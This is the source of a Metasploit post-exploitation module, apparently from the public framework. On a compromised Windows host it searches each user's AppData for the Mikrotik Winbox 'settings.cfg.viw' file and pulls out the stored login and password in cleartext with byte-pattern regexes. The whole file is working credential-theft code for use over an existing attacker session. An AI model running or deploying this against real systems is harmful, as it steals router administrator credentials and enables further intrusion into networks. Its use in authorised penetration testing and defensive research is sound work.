##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Windows::UserProfiles

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Gather Mikrotik Winbox "Keep Password" Credentials Extractor',
        'Description' => %q{
          This module extracts Mikrotik Winbox credentials saved in the
          "settings.cfg.viw" file when the "Keep Password" option is
          selected in Winbox.
        },
        'License' => MSF_LICENSE,
        'Author' => ['Pasquale \'sid\' Fiorillo'], # www.pasqualefiorillo.it - Thanks to: www.isgroup.biz
        'Platform' => ['win'],
        'SessionTypes' => ['meterpreter', 'shell', 'powershell'],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => []
        }
      )
    )
  end

  def run
    print_status('Checking Default Locations...')
    grab_user_profiles.each do |user|
      next if user['AppData'].nil?

      check_appdata(user['AppData'] + '\\Mikrotik\\Winbox\\settings.cfg.viw')
    end
  end

  def check_appdata(path)
    if file_exist?(path)
      print_good("Found File at #{path}")
      data = read_file(path)
      if datastore['VERBOSE']
        print_hexdump(data)
      end
      parse(data)

    else
      print_status("#{path} not found ....")
    end
  end

  def file_data; end

  def print_hexdump(data)
    index = 0
    while index < data.length
      chunk = data[index, [16, data.length - index].min]
      hex_chunk = chunk.each_byte.map { |b| sprintf('%02x', b) }.join(' ')
      ascii_chunk = chunk.gsub(/[^[:print:]]/, '.')
      print_status("#{hex_chunk.ljust(48)} #{ascii_chunk}")
      index += 16
    end
  rescue StandardError => e
    print_error("An error occurred: #{e.message}")
  end

  def parse(data)
    login = data.match(/\x00\x05login(.*)\x08\x00/)
    print_good("Login: #{login[1]}")

    password = data.match(/\x00\x03pwd(.*)\x0B\x00/)
    print_good("Password: #{password[1]}")
  rescue StandardError => e
    print_error("An error occurred: #{e.message}")
  end

end
